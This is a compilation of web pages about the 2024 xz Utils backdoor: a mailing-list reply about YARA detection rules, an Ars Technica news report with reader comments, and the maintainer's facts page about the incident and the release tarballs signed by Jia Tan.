* [Cybersecurity and Infrastructure Security Agency](/Tag/Cybersecurity%20and%20Infrastructure%20Security%20Agency/)
* [Cybersecurity Information Sharing Act](/Tag/Cybersecurity%20Information%20Sharing%20Act/)
* [Database](/Tag/Database/)
* [Data Breach](/Tag/Data%20Breach/)
* [Data Protection](/Tag/Data%20Protection/)
* [Data Theft](/Tag/Data%20Theft/)
* [DDoS](/Tag/DDoS/)
* [Debian](/Tag/Debian/)
* [DEF CON](/Tag/DEF%20CON/)
* [Digital certificate](/Tag/Digital%20certificate/)
* [Encryption](/Tag/Encryption/)
* [Exploit](/Tag/Exploit/)
* [Fedora](/Tag/Fedora/)
* [Firewall](/Tag/Firewall/)
* [FOSDEM](/Tag/FOSDEM/)
* [GNOME](/Tag/GNOME/)
* [Grab](/Tag/Grab/)
* [Graphics Interchange Format](/Tag/Graphics%20Interchange%20Format/)
* [Hacker](/Tag/Hacker/)
* [Hacking](/Tag/Hacking/)
* [Hacktivism](/Tag/Hacktivism/)
* [IDE](/Tag/IDE/)
* [Identity Theft](/Tag/Identity%20Theft/)
* [Incident response](/Tag/Incident%20response/)
* [Infosec](/Tag/Infosec/)
* [Jenkins](/Tag/Jenkins/)
* [Kenna Security](/Tag/Kenna%20Security/)
* [Legacy Technology](/Tag/Legacy%20Technology/)
* [LibreOffice](/Tag/LibreOffice/)
* [Linux Foundation](/Tag/Linux%20Foundation/)
* [Map](/Tag/Map/)
* [Microsoft 365](/Tag/Microsoft%20365/)
* [Microsoft Office](/Tag/Microsoft%20Office/)
* [Microsoft Teams](/Tag/Microsoft%20Teams/)
* [Mobile Device Management](/Tag/Mobile%20Device%20Management/)
* [NCSAM](/Tag/NCSAM/)
* [NCSC](/Tag/NCSC/)
* [One Way Forward](/Tag/One%20Way%20Forward/)
* [OpenOffice](/Tag/OpenOffice/)
* [OpenShift](/Tag/OpenShift/)
* [Palo Alto Networks](/Tag/Palo%20Alto%20Networks/)
* [Password](/Tag/Password/)
* [Phishing](/Tag/Phishing/)
* [Programming Language](/Tag/Programming%20Language/)
* [QR code](/Tag/QR%20code/)
* [Quantum key distribution](/Tag/Quantum%20key%20distribution/)
* [Ransomware](/Tag/Ransomware/)
* [Remote Access Trojan](/Tag/Remote%20Access%20Trojan/)
* [Retro computing](/Tag/Retro%20computing/)
* [REvil](/Tag/REvil/)
* [RHEL](/Tag/RHEL/)
* [RSA Conference](/Tag/RSA%20Conference/)
* [Search Engine](/Tag/Search%20Engine/)
* [Software bug](/Tag/Software%20bug/)
* [Software License](/Tag/Software%20License/)
* [Spamming](/Tag/Spamming/)
* [Spyware](/Tag/Spyware/)
* [Surveillance](/Tag/Surveillance/)
* [Text Editor](/Tag/Text%20Editor/)
* [TLS](/Tag/TLS/)
* [Trojan](/Tag/Trojan/)
* [Trusted Platform Module](/Tag/Trusted%20Platform%20Module/)
* [User interface](/Tag/User%20interface/)
* [Visual Studio](/Tag/Visual%20Studio/)
* [Visual Studio Code](/Tag/Visual%20Studio%20Code/)
* [Vulnerability](/Tag/Vulnerability/)
* [Wannacry](/Tag/Wannacry/)
* [WebAssembly](/Tag/WebAssembly/)
* [Web Browser](/Tag/Web%20Browser/)
* [Windows Subsystem for Linux](/Tag/Windows%20Subsystem%20for%20Linux/)
* [WordPress](/Tag/WordPress/)
* [Zero trust](/Tag/Zero%20trust/)

### Broader topics

* [FOSS](/Tag/FOSS/)
* [Linus Torvalds](/Tag/Linus%20Torvalds/)
* [Operating System](/Tag/Operating%20System/)

#### More about

![](/design_picker/d2e337b97204af4aa34dda04c4e5d56d954b216f/graphics/icons/social_share_icon.svg)
Share

[**123**
![comment bubble on white](/design_picker/f5daacc84b9722c1e31ba85f836c37e4ad993fc4/graphics/icons/bubble_comment_white.png)
COMMENTS](https://forums.theregister.com/forum/all/2024/03/29/malicious_backdoor_xz/ "View comments on this article")

#### More about

* [Linux](/Tag/Linux/)
* [Red Hat](/Tag/Red%20Hat/)
* [Security](/Tag/Security/)

More like these

×
### More about

* [Linux](/Tag/Linux/)
* [Red Hat](/Tag/Red%20Hat/)
* [Security](/Tag/Security/)
* [Software](/Tag/Software/)

### Narrower topics

* [2FA](/Tag/2FA/)
* [AdBlock Plus](/Tag/AdBlock%20Plus/)
* [Advanced persistent threat](/Tag/Advanced%20persistent%20threat/)
* [App](/Tag/App/)
* [Application Delivery Controller](/Tag/Application%20Delivery%20Controller/)
* [Asahi Linux](/Tag/Asahi%20Linux/)
* [Audacity](/Tag/Audacity/Audio%20Editor/ "Disambiguation: Audio Editor")
* [Authentication](/Tag/Authentication/)
* [BEC](/Tag/BEC/)
* [Black Hat](/Tag/Black%20Hat/)
* [BSides](/Tag/BSides/)
* [Bug Bounty](/Tag/Bug%20Bounty/)
* [CentOS](/Tag/CentOS/)
* [CHERI](/Tag/CHERI/)
* [Common Vulnerability Scoring System](/Tag/Common%20Vulnerability%20Scoring%20System/)
* [Confluence](/Tag/Confluence/)
* [Cybercrime](/Tag/Cybercrime/)
* [Cybersecurity](/Tag/Cybersecurity/)
* [Cybersecurity and Infrastructure Security Agency](/Tag/Cybersecurity%20and%20Infrastructure%20Security%20Agency/)
* [Cybersecurity Information Sharing Act](/Tag/Cybersecurity%20Information%20Sharing%20Act/)
* [Database](/Tag/Database/)
* [Data Breach](/Tag/Data%20Breach/)
* [Data Protection](/Tag/Data%20Protection/)
* [Data Theft](/Tag/Data%20Theft/)
* [DDoS](/Tag/DDoS/)
* [Debian](/Tag/Debian/)
* [DEF CON](/Tag/DEF%20CON/)
* [Digital certificate](/Tag/Digital%20certificate/)
* [Encryption](/Tag/Encryption/)
* [Exploit](/Tag/Exploit/)
* [Fedora](/Tag/Fedora/)
* [Firewall](/Tag/Firewall/)
* [FOSDEM](/Tag/FOSDEM/)
* [GNOME](/Tag/GNOME/)
* [Grab](/Tag/Grab/)
* [Graphics Interchange Format](/Tag/Graphics%20Interchange%20Format/)
* [Hacker](/Tag/Hacker/)
* [Hacking](/Tag/Hacking/)
* [Hacktivism](/Tag/Hacktivism/)
* [IDE](/Tag/IDE/)
* [Identity Theft](/Tag/Identity%20Theft/)
* [Incident response](/Tag/Incident%20response/)
* [Infosec](/Tag/Infosec/)
* [Jenkins](/Tag/Jenkins/)
* [Kenna Security](/Tag/Kenna%20Security/)
* [Legacy Technology](/Tag/Legacy%20Technology/)
* [LibreOffice](/Tag/LibreOffice/)
* [Linux Foundation](/Tag/Linux%20Foundation/)
* [Map](/Tag/Map/)
* [Microsoft 365](/Tag/Microsoft%20365/)
* [Microsoft Office](/Tag/Microsoft%20Office/)
* [Microsoft Teams](/Tag/Microsoft%20Teams/)
* [Mobile Device Management](/Tag/Mobile%20Device%20Management/)
* [NCSAM](/Tag/NCSAM/)
* [NCSC](/Tag/NCSC/)
* [One Way Forward](/Tag/One%20Way%20Forward/)
* [OpenOffice](/Tag/OpenOffice/)
* [OpenShift](/Tag/OpenShift/)
* [Palo Alto Networks](/Tag/Palo%20Alto%20Networks/)
* [Password](/Tag/Password/)
* [Phishing](/Tag/Phishing/)
* [Programming Language](/Tag/Programming%20Language/)
* [QR code](/Tag/QR%20code/)
* [Quantum key distribution](/Tag/Quantum%20key%20distribution/)
* [Ransomware](/Tag/Ransomware/)
* [Remote Access Trojan](/Tag/Remote%20Access%20Trojan/)
* [Retro computing](/Tag/Retro%20computing/)
* [REvil](/Tag/REvil/)
* [RHEL](/Tag/RHEL/)
* [RSA Conference](/Tag/RSA%20Conference/)
* [Search Engine](/Tag/Search%20Engine/)
* [Software bug](/Tag/Software%20bug/)
* [Software License](/Tag/Software%20License/)
* [Spamming](/Tag/Spamming/)
* [Spyware](/Tag/Spyware/)
* [Surveillance](/Tag/Surveillance/)
* [Text Editor](/Tag/Text%20Editor/)
* [TLS](/Tag/TLS/)
* [Trojan](/Tag/Trojan/)
* [Trusted Platform Module](/Tag/Trusted%20Platform%20Module/)
* [User interface](/Tag/User%20interface/)
* [Visual Studio](/Tag/Visual%20Studio/)
* [Visual Studio Code](/Tag/Visual%20Studio%20Code/)
* [Vulnerability](/Tag/Vulnerability/)
* [Wannacry](/Tag/Wannacry/)
* [WebAssembly](/Tag/WebAssembly/)
* [Web Browser](/Tag/Web%20Browser/)
* [Windows Subsystem for Linux](/Tag/Windows%20Subsystem%20for%20Linux/)
* [WordPress](/Tag/WordPress/)
* [Zero trust](/Tag/Zero%20trust/)

### Broader topics

* [FOSS](/Tag/FOSS/)
* [Linus Torvalds](/Tag/Linus%20Torvalds/)
* [Operating System](/Tag/Operating%20System/)

#### TIP US OFF

[Send us news](https://www.theregister.com/Profile/contact/)

---

### Other stories you might like

[#### Free-software warriors celebrate landmark case that enforced GNU LGPL

On the Fritz: German router maker AVM lets device rights case end after coughing up source code
Software10 Jan 2025 | 19](/2025/01/10/german_router_maker_avm_lgpl/?td=keepreading)

[#### Look for the label: White House rolls out 'Cyber Trust Mark' for smart devices

Beware the IoT that doesn’t get a security tag
Security9 Jan 2025 | 36](/2025/01/09/white_house_smart_device_security_label/?td=keepreading)

[#### Boffins carve up C so code can be converted to Rust

Mini-C is a subset of C that can be automatically turned to Rust without much fuss
Software3 Jan 2025 | 117](/2025/01/03/mini_c_microsoft_inria/?td=keepreading)

[#### Fortify your data

How cyber resilient storage hardware can defeat ransomware
Sponsored Feature](/2024/11/26/fortify_your_data/?td=keepreading)

[![](https://pubads.g.doubleclick.net/gampad/ad?co=1&iu=/6978/reg_security/cso&sz=300x50%7C300x100%7C300x250%7C300x251%7C300x252%7C300x600%7C300x601&tile=6&c=66Z4HoOzK4FuHbq-6fef6TIwAAANI&t=ct%3Dns%26unitnum%3D6%26raptor%3Dhawk%26pos%3Dbtm%26test%3D0)](https://pubads.g.doubleclick.net/gampad/jump?co=1&iu=/6978/reg_security/cso&sz=300x50%7C300x100%7C300x250%7C300x251%7C300x252%7C300x600%7C300x601&tile=6&c=66Z4HoOzK4FuHbq-6fef6TIwAAANI&t=ct%3Dns%26unitnum%3D6%26raptor%3Dhawk%26pos%3Dbtm%26test%3D0)

[#### Apple auto-opts everyone into having their photos analyzed by AI for landmarks

Homomorphic-based Enhanced Visual Search is so privacy-preserving, iPhone giant activated it without asking
Personal Tech3 Jan 2025 | 68](/2025/01/03/apple_enhanced_visual_search/?td=keepreading)

[#### 3Blue1Brown copyright takedown blunder by AI biz blamed on human error

Worker copy-pasted wrong YouTube URL, says ChainPatrol
AI + ML7 Jan 2025 | 55](/2025/01/07/3blue1brown_video_takedown_mistake/?td=keepreading)

[#### Uncle Sam now targets six landlord giants in war on alleged algorithmic rent fixing

One of ya is gonna sing like a canary, prosecutors say
AI + ML8 Jan 2025 | 22](/2025/01/08/feds_expand_algorithmic_rent_lawsuit/?td=keepreading)

[#### After China's Salt Typhoon, the reconstruction starts now

Opinion If 40 years of faulty building gets blown down, don’t rebuild with the rubble
Cyber-crime6 Jan 2025 | 40](/2025/01/06/opinion_column_cybersec/?td=keepreading)

[#### Database tables of student, teacher info stolen from PowerSchool in cyberattack

Class act: Cloud biz only serves 60M-plus folks globally, no biggie
Cyber-crime9 Jan 2025 | 23](/2025/01/09/powerschool_school_data/?td=keepreading)

[#### Mitel 0-day, 5-year-old Oracle RCE bug under active exploit

3 CVEs added to CISA's catalog
Security8 Jan 2025 | 4](/2025/01/08/mitel_0_day_oracle_rce_under_exploit/?td=keepreading)

[#### Just when you thought terminal emulators couldn't get any better, Ghostty ships

HashiCorp co-founder's side project reaches 1.0 – er, 1.0.1
Applications8 Jan 2025 | 90](/2025/01/08/ghostty_1/?td=keepreading)

[#### Chinese cyber-spies reportedly targeted sanctions intel in US Treasury raid

OFAC, Office of the Treasury Secretary feared hit in data-snarfing swoop
CSO2 Jan 2025 | 3](/2025/01/02/chinese_spies_targeted_sanctions_intel/?td=keepreading)

The Register ![icon](/design_picker/d518b499f8a6e2c65d4d8c49aca8299d54b03012/graphics/icon/vulture_white.png) Biting the hand that feeds IT

#### About Us

* [Contact us](https://www.theregister.com/Profile/contact/)
* [Advertise with us](https://www.theregister.com/AdvertiseWithUs/)
* [Who we are](https://www.theregister.com/Profile/about_the_register/)

#### Our Websites

* [The Next Platform](https://www.nextplatform.com/)
* [DevClass](https://devclass.com/)
* [Blocks and Files](https://blocksandfiles.com/)

#### Your Privacy

* [Cookies Policy](https://www.theregister.com/Profile/cookies/)
* [Privacy Policy](https://www.theregister.com/Profile/privacy/)
* [Ts & Cs](https://www.theregister.com/Profile/terms_and_conditions_of_use/)

[![Situation Publishing](/design_picker/d2e337b97204af4aa34dda04c4e5d56d954b216f/graphics/std/sitpublogo_2022.png)](https://situationpublishing.com/)

Copyright. All rights reserved © 1998–2025

![no-js](/Design/graphics/std/transparent_pixel.png)



=== Content from www.openwall.com_5202f171_20250111_034002.html ===


| [Openwall](/) * [Products](/)   + [Openwall GNU/\*/Linux   *server OS*](/Owl/)+ [Linux Kernel Runtime Guard](/lkrg/)+ [John the Ripper   *password cracker*](/john/)         - [Free & Open Source for any platform](/john/)- [in the cloud](/john/cloud/)- [Pro for Linux](/john/pro/linux/)- [Pro for macOS](/john/pro/macosx/)+ [Wordlists   *for password cracking*](/wordlists/)+ [passwdqc   *policy enforcement*](/passwdqc/)             - [Free & Open Source for Unix](/passwdqc/)- [Pro for Windows (Active Directory)](/passwdqc/windows/)+ [yescrypt   *KDF & password hashing*](/yescrypt/)+ [yespower   *Proof-of-Work (PoW)*](/yespower/)+ [crypt\_blowfish   *password hashing*](/crypt/)+ [phpass   *ditto in PHP*](/phpass/)+ [tcb   *better password shadowing*](/tcb/)+ [Pluggable Authentication Modules](/pam/)+ [scanlogd   *port scan detector*](/scanlogd/)+ [popa3d   *tiny POP3 daemon*](/popa3d/)+ [blists   *web interface to mailing lists*](/blists/)+ [msulogin   *single user mode login*](/msulogin/)+ [php\_mt\_seed   *mt\_rand() cracker*](/php_mt_seed/)* [Services](/services/)* Publications       + [Articles](/articles/)+ [Presentations](/presentations/)* Resources         + [Mailing lists](/lists/)+ [Community wiki](https://openwall.info/wiki/)+ [Source code repositories (GitHub)](https://github.com/openwall)+ [Source code repositories (CVSweb)](https://cvsweb.openwall.com)+ [File archive & mirrors](/mirrors/)+ [How to verify digital signatures](/signatures/)+ [OVE IDs](/ove/)* [What's new](/news) | |
| --- | --- |

| | [Hash Suite - Windows password security audit tool. GUI, reports in PDF.](https://hashsuite.openwall.net) | | --- | |
| --- | --- |

[[<prev]](11) [[next>]](13) [[<thread-prev]](11) [[thread-next>]](13) [[day]](.) [[month]](..) [[year]](../..) [[list]](../../..)
```

Message-ID: <ZgfaJdGLATs99Ykn@weckbecker.name>
Date: Sat, 30 Mar 2024 10:23:49 +0100
From: Matthias Weckbecker <matthias@...kbecker.name>
To: oss-security@...ts.openwall.com
Subject: Re: backdoor in upstream xz/liblzma leading to ssh
 server compromise

On Fri, Mar 29, 2024 at 12:19:26PM -0700, Andres Freund wrote:
> Hi,
>

Hi Andres,

> On 2024-03-29 19:44:05 +0100, Matthias Weckbecker wrote:
> > I've attached a yara rule to detect the *.o droplet you attached in the
> > email (liblzma_la-crc64-fast.o.gz).
>
> Unfortunately xz 5.61 added further obfuscations, making it harder to
> detect. Should have made it clearer that the attached .o was from 5.60. Among
> others 5.61 removed the two symbols you're checking against here.  That's why
> Vegard's script looks for a specific instructions sequence, but obviously is
> also more obscure :/
>

Yes, all correct. For this you'll have to match characteristic sequences
of instructions. I've attached a yara rule for this as well.

> Regards,
>
> Andres

Thanks,
Matthias

View attachment "[CVE-2024-3094-p.yara](12/1)" of type "text/plain" (863 bytes)

```

[Powered by blists](https://www.openwall.com/blists/) - [more mailing lists](https://lists.openwall.net)

Please check out the
[Open Source Software Security Wiki](https://oss-security.openwall.org/wiki/), which is counterpart to this
[mailing list](https://oss-security.openwall.org/wiki/mailing-lists/oss-security).

Confused about [mailing lists](/lists/) and their use?
[Read about mailing lists on Wikipedia](https://en.wikipedia.org/wiki/Electronic_mailing_list)
and check out these
[guidelines on proper formatting of your messages](https://www.complang.tuwien.ac.at/anton/mail-news-errors.html).



=== Content from arstechnica.com_39fbd1db_20250111_034004.html ===


[Skip to content](#main)

[Ars Technica home](https://arstechnica.com/)

Sections

[Forum](/civis/)

[Subscribe](/store/product/subscriptions/)

* [AI](https://arstechnica.com/ai/)
* [Biz & IT](https://arstechnica.com/information-technology/)
* [Cars](https://arstechnica.com/cars/)
* [Culture](https://arstechnica.com/culture/)
* [Gaming](https://arstechnica.com/gaming/)
* [Health](https://arstechnica.com/health/)
* [Policy](https://arstechnica.com/tech-policy/)
* [Science](https://arstechnica.com/science/)
* [Security](https://arstechnica.com/security/)
* [Space](https://arstechnica.com/space/)
* [Tech](https://arstechnica.com/gadgets/)

* [Feature](/features/)
* [Reviews](/reviews/)
* [Store](/store/)

* [AI](https://arstechnica.com/ai/)
* [Biz & IT](https://arstechnica.com/information-technology/)
* [Cars](https://arstechnica.com/cars/)
* [Culture](https://arstechnica.com/culture/)
* [Gaming](https://arstechnica.com/gaming/)
* [Health](https://arstechnica.com/health/)
* [Policy](https://arstechnica.com/tech-policy/)
* [Science](https://arstechnica.com/science/)
* [Security](https://arstechnica.com/security/)
* [Space](https://arstechnica.com/space/)
* [Tech](https://arstechnica.com/gadgets/)

[Forum](/civis/)

[Subscribe](/store/product/subscriptions/)

Story text

Size
Small
Standard
Large

Width
\*

Standard
Wide

Links
Standard
Orange

\* Subscribers only

  [Learn more](/store/product/subscriptions/)

Pin to story

Theme

* HyperLight
* Day & Night
* Dark
* System

Search dialog...

Sign In

Sign in dialog...

Sign in

SUPPLY CHAIN ATTACK

# Backdoor found in widely used Linux utility targets encrypted SSH connections

Malicious code planted in xz Utils has been circulating for more than a month.

[Dan Goodin](https://arstechnica.com/author/dan-goodin/)
–
Mar 29, 2024 2:50 pm

| [237](https://arstechnica.com/security/2024/03/backdoor-found-in-widely-used-linux-utility-breaks-encrypted-ssh-connections/#comments "237 comments")

[![](https://cdn.arstechnica.net/wp-content/uploads/2024/03/backdoor-1.jpg)](https://cdn.arstechnica.net/wp-content/uploads/2024/03/backdoor-1.jpg)

Internet Backdoor in a string of binary code in a shape of an eye.
Credit:
Getty Images

Internet Backdoor in a string of binary code in a shape of an eye.
Credit:
Getty Images

Text
settings

Story text

Size
Small
Standard
Large

Width
\*

Standard
Wide

Links
Standard
Orange

\* Subscribers only

  [Learn more](/store/product/subscriptions/)

Minimize to nav

Researchers have found a malicious backdoor in a compression tool that made its way into widely used Linux distributions, including those from Red Hat and Debian.

The compression utility, known as [xz Utils](https://github.com/tukaani-project/xz), introduced the malicious code in versions ​​5.6.0 and 5.6.1, [according to](https://www.openwall.com/lists/oss-security/2024/03/29/4) Andres Freund, the developer who discovered it. There are no known reports of those versions being incorporated into any production releases for major Linux distributions, but both [Red Hat](https://www.redhat.com/en/blog/urgent-security-alert-fedora-41-and-rawhide-users) and [Debian](https://lists.debian.org/debian-security-announce/2024/msg00057.html) reported that recently published beta releases used at least one of the backdoored versions—specifically, in Fedora Rawhide and Debian testing, unstable and experimental distributions. A stable release of Arch Linux is also affected. That distribution, however, isn't used in production systems.

Because the backdoor was discovered before the malicious versions of xz Utils were added to production versions of Linux, “it's not really affecting anyone in the real world,” Will Dormann, a senior vulnerability analyst at security firm Analygence, said in an online interview. “BUT that's only because it was discovered early due to bad actor sloppiness. Had it not been discovered, it would have been catastrophic to the world.”

Several people, including two Ars readers, reported that the multiple apps included in the HomeBrew package manager for macOS rely on the backdoored 5.6.1 version of xz Utils. HomeBrew has now rolled back the utility to version 5.4.6. Maintainers have more details available [here](https://github.com/orgs/Homebrew/discussions/5243#discussioncomment-8954951).

## Targeting sshd

The first signs of the backdoor were introduced in a February 23 update that added obfuscated code, officials from Red Hat said in an email. An update the following day included a malicious install script that injected itself into functions used by sshd, the binary file that makes SSH work. The malicious code has resided only in the archived releases—known as tarballs—which are released upstream. So-called GIT code available in repositories aren’t affected, although they do contain second-stage artifacts allowing the injection during the build time. In the event the obfuscated code introduced on February 23 is present, the artifacts in the GIT version allow the backdoor to operate.

The malicious changes were submitted by JiaT75, one of the two main xz Utils developers with years of contributions to the project.

“Given the activity over several weeks, the committer is either directly involved or there was some quite severe compromise of their system,” Freund wrote. “Unfortunately the latter looks like the less likely explanation, given they communicated on various lists about the ‘fixes’” provided in recent updates. Those updates and fixes can be found [here](https://github.com/tukaani-project/xz/commit/e5faaebbcf02ea880cfc56edc702d4f7298788ad), [here](https://github.com/tukaani-project/xz/commit/72d2933bfae514e0dbb123488e9f1eb7cf64175f), [here](https://github.com/tukaani-project/xz/commit/82ecc538193b380a21622aea02b0ba078e7ade92), and [here](https://github.com/tukaani-project/xz/commit/6e636819e8f070330d835fce46289a3ff72a7b89).

On Thursday, someone using the developer's name took to a developer site for Ubuntu to ask that the backdoored version 5.6.1 be [incorporated into production versions](https://bugs.launchpad.net/ubuntu/%2Bsource/xz-utils/%2Bbug/2059417) because it fixed bugs that caused a tool known as Valgrind to malfunction.

“This could break build scripts and test pipelines that expect specific output from Valgrind in order to pass,” the person warned, from an account that was created the same day.

One of maintainers for Fedora [said Friday](https://news.ycombinator.com/item?id=39866275) that the same developer approached them in recent weeks to ask that Fedora 40, a beta release, incorporate one of the backdoored utility versions.

“We even worked with him to fix the valgrind issue (which it turns out now was caused by the backdoor he had added),” the Ubuntu maintainer said. "He has been part of the xz project for two years, adding all sorts of binary test files, and with this level of sophistication, we would be suspicious of even older versions of xz until proven otherwise."

Maintainers for xz Utils didn’t immediately respond to emails asking questions.

The malicious versions, researchers said, intentionally interfere with authentication performed by SSH, a commonly used protocol for connecting remotely to systems. SSH provides robust encryption to ensure that only authorized parties connect to a remote system. The backdoor is designed to allow a malicious actor to break the authentication and, from there, gain unauthorized access to the entire system. The backdoor works by injecting code during a key phase of the login process.

“I have not yet analyzed precisely what is being checked for in the injected code, to allow unauthorized access,” Freund wrote. “Since this is running in a pre-authentication context, it seems likely to allow some form of access or other form of remote code execution.”

[**Update:** Researchers who spent the weekend reverse engineering the updates say that the backdoor injected malicious code during SSH operations, rather than bypassed authenticatiion.]

In some cases, the backdoor has been unable to work as intended. The build environment on Fedora 40, for example, contains incompatibilities that prevent the injection from correctly occurring. Fedora 40 has now reverted to the 5.4.x versions of xz Utils.

Xz Utils is available for most if not all Linux distributions, but not all of them include it by default. Anyone using Linux should check with their distributor immediately to determine if their system is affected. Freund provided a script for detecting if an SSH system is vulnerable.

Listing image:
Getty Images

[![Photo of Dan Goodin](/wp-content/uploads/2018/10/Dang.jpg)](https://arstechnica.com/author/dan-goodin/)
[Dan Goodin](https://arstechnica.com/author/dan-goodin/)
Senior Security Editor

[Dan Goodin](https://arstechnica.com/author/dan-goodin/)
Senior Security Editor

Dan Goodin is Senior Security Editor at Ars Technica, where he oversees coverage of malware, computer espionage, botnets, hardware hacking, encryption, and passwords. In his spare time, he enjoys gardening, cooking, and following the independent music scene. Dan is based in San Francisco. Follow him at [here](https://infosec.exchange/%40dangoodin) on Mastodon and [here](https://bsky.app/profile/dangoodin.bsky.social) on Bluesky. Contact him on Signal at DanArs.82.

[237 Comments](https://arstechnica.com/security/2024/03/backdoor-found-in-widely-used-linux-utility-breaks-encrypted-ssh-connections/#comments "237 comments")

Staff Picks

![adamsc](https://cdn.arstechnica.net/civis/data/avatars/m/15/15625.jpg?1668050701)
[adamsc](https://arstechnica.com/civis/members/adamsc.15625/)

> Oh, so having one init to rule them all and take over every function of your system was a great idea right?

Please take the systemd trolling back to Reddit. The only connection here is that they call sd\_notify to report when the process is healthy so the systemd status is accurate and can be used to trigger other things:

[March 29, 2024 at 8:25 pm](https://arstechnica.com/civis/posts/42712026/)

![adamsc](https://cdn.arstechnica.net/civis/data/avatars/m/15/15625.jpg?1668050701)
[adamsc](https://arstechnica.com/civis/members/adamsc.15625/)

> While this is particularly pernicious in open source since anybody can see the code, who contributed, etc., I don't believe it would be difficult to do this with corporate code.
>
>
>
> With a little social engineering you could figure out who works on what bits of Windows and/or OSX.
>
>
>
> With the right convincing said developer could sneak code into those projects. Particularly if they're messing with macros, changing flags to valgrind or its equivalent, etc.

Yeah, my point wasn't that closed source is better but simply that open source projects are exposed because there are many projects which are widely used, accept contributions from anyone on the internet, but have only a handful of maintainers. Microsoft doesn't accept pull requests for Windows on GitHub but if they did, they'd also have the budget to hire people whose full-time job would be to review things.

As a long-time open source contributor, this trend has been fairly sad because so much of the internet used to run on a community trust model that frankly isn't sustainable. Most of the ways we could combat this are going to directly impact one of the things I used to like the most: people are going to rely more on reputation, which means someone with a contribution from, say, @google.com is going to get their stuff merged faster than someone at [@Gmail.com](https://arstechnica.com/civis/members/870841/), which I don't like even if I completely understand why that will happen.

[March 29, 2024 at 8:31 pm](https://arstechnica.com/civis/posts/42712045/)

G
[GolbatsEverywhere](https://arstechnica.com/civis/members/golbatseverywhere.755805/)

This might have been the worst Linux backdoor in history except that it was caught so soon. An SSH authentication backdoor is surely worse than the Debian weak keys incident and also worse than Heartbleed, the two most notorious Linux security incidents that I can think of. Probably this would have been abused to hack most if not all of the Fortune 500, except Mr. Freund decided to investigate some small performance issue that anybody else would have dismissed as unimportant. We are spared only due to sheer dumb luck. This guy has probably just averted *at least* billions of dollars worth of damages. Cannot emphasize enough how grateful we should be to him right now.

But who knows how many other Linux packages are backdoored by other malicious upstream software developers. If it can be done to one project, it can be done to others just the same.

P.S. Address sanitizer really does need to be disabled when working with ifuncs, <https://gcc.gnu.org/bugzilla/show_bug.cgi?id=110442>. Maybe valgrind has a similar bug? (Not sure; that's pure speculation.) That could explain why the other developers were not more suspicious of the malicious commits that hid the problems.

[March 29, 2024 at 11:25 pm](https://arstechnica.com/civis/posts/42712447/)

Comments

[Forum view](https://arstechnica.com/civis/threads/backdoor-found-in-widely-used-linux-utility-breaks-encrypted-ssh-connections.1499791/)

![Loading](https://arstechnica.com/wp-content/themes/ars-v9/public/images/firework-loader.75ab30.gif)
Loading comments...

[Prev story](https://arstechnica.com/tech-policy/2024/03/jails-banned-family-visits-to-make-more-money-on-video-calls-lawsuits-claim/ "Go to: Jails banned visits in “quid pro quo” with prison phone companies, lawsuits say")

[Next story](https://arstechnica.com/ai/2024/03/nycs-government-chatbot-is-lying-about-city-laws-and-regulations/ "Go to: NYC’s government chatbot is lying about city laws and regulations")

Most Read

1. [![Listing image for first story in Most Read: Judge ends man’s 11-year quest to dig up landfill and recover $765M in bitcoin](https://cdn.arstechnica.net/wp-content/uploads/2025/01/newport-landfill-768x432-1736530527.jpg)](https://arstechnica.com/tech-policy/2025/01/judge-ends-mans-11-year-quest-to-dig-up-landfill-and-recover-765m-in-bitcoin/)

   1.
   [Judge ends man’s 11-year quest to dig up landfill and recover $765M in bitcoin](https://arstechnica.com/tech-policy/2025/01/judge-ends-mans-11-year-quest-to-dig-up-landfill-and-recover-765m-in-bitcoin/)
2. 2.
   [A glowing ring of metal fell to Earth, and no one has any idea what it is](https://arstechnica.com/space/2025/01/a-glowing-ring-of-metal-fell-to-earth-and-no-one-has-any-idea-what-it-is/)
3. 3.
   [A taller, heavier, smarter version of SpaceX’s Starship is almost ready to fly](https://arstechnica.com/space/2025/01/a-taller-heavier-smarter-version-of-spacexs-starship-is-almost-ready-to-fly/)
4. 4.
   [Why I’m disappointed with the TVs at CES 2025](https://arstechnica.com/gadgets/2025/01/ces-2025-teases-alarming-smart-tv-future-loaded-with-unwanted-software-gimmicks/)
5. 5.
   [US selling 69K seized bitcoins could mess with Trump plans for crypto reserve](https://arstechnica.com/tech-policy/2025/01/us-selling-69k-seized-bitcoins-could-mess-with-trump-plans-for-crypto-reserve/)

Customize

Ars Technica has been separating the signal from
the noise for over 25 years. With our unique combination of
technical savvy and wide-ranging interest in the technological arts
and sciences, Ars is the trusted source in a sea of information. After
all, you don’t need to know everything, only what’s important.

More
from Ars

* [About Us](https://arstechnica.com/about-us/)
* [Staff Directory](https://arstechnica.com/staff-directory/)
* [Newsletters](https://arstechnica.com/newsletters/)
* [Ars Videos](https://arstechnica.com/video/)
* [General FAQ](https://arstechnica.com/general-faq/)
* [RSS Feeds](https://arstechnica.com/rss-feeds/)

Contact

* [Contact us](https://arstechnica.com/contact-us/)
* [Advertise with us](https://www.condenast.com/brands/ars-technica)
* [Reprints](https://arstechnica.com/reprints/)

Do Not Sell My Personal
Information

© 2025 Condé Nast. All rights reserved. Use of and/or
registration on any portion of this site constitutes acceptance of our [User Agreement](https://www.condenast.com/user-agreement/) and
[Privacy Policy and
Cookie Statement](https://www.condenast.com/privacy-policy/) and [Ars
Technica Addendum](/amendment-to-conde-nast-user-agreement-privacy-policy/) and [Your
California Privacy Rights](https://www.condenast.com/privacy-policy/#california). Ars Technica may earn compensation on
sales from links on this site. [Read our
affiliate link policy](/affiliate-link-policy/). The material on this site may not be
reproduced, distributed, transmitted, cached or otherwise used, except
with the prior written permission of Condé Nast. [Ad
Choices](https://www.aboutads.info/)



=== Content from tukaani.org_e4f4f3f8_20250111_034038.html ===


[tukaani.org](../) » XZ Utils backdoor

---

# XZ Utils backdoor

Lasse Collin

This page will get updated as I learn more about the incident.

## Facts

* CVE-2024-3094
* XZ Utils 5.6.0 and 5.6.1 release tarballs contain a backdoor.
  These tarballs were created and signed by *Jia Tan*.
* Tarballs created by Jia Tan were signed by him.
  Any tarballs signed by me were created by me.
* GitHub accounts of both me (Larhzu) and Jia Tan were suspended.
  Mine was reinstated on 2024-04-02.
* Only I have had access to the main tukaani.org website,
  git.tukaani.org repositories, and related files.
  Jia Tan only had access to things hosted on GitHub,
  including xz.tukaani.org subdomain (and only that subdomain).
* The XZ projects have been moved to their old URLs on tukaani.org.
  XZ Utils’s home page is under construction still though.
* xz.tukaani.org DNS name (CNAME) has been removed and won’t be restored.
